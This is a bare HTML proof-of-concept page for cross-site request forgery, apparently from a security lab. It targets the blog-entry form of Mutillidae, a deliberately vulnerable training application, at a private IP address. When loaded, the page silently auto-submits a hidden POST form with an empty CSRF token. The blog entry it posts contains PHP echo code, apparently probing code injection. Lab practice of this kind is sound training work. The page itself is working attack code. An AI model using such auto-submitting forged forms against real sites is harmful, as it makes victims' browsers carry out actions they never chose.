<body onload="document.getElementById('f').submit()">
<form id="f" action="http://192.168.176.128/mutillidae/index.php?page=add-to-your-blog.php" method="POST">
<input name="csrf-token" value="" type="hidden"/>
<textarea title="" name="blog_entry" htmlandxssandsqlinjectionpoint="1" rows="8" cols="65" autofocus="1"/><?php echo "Hey!";echo "&nbsp"; echo "I"; echo "&nbsp"; echo "Am"; echo "&nbsp"; echo "L"; ?></textarea>
<input class="button" title="" name="add-to-your-blog-php-submit-button" xsrfvulnerabilityarea="1"
value="Save Blog Entry" type="hidden"/>
</form>
</body>
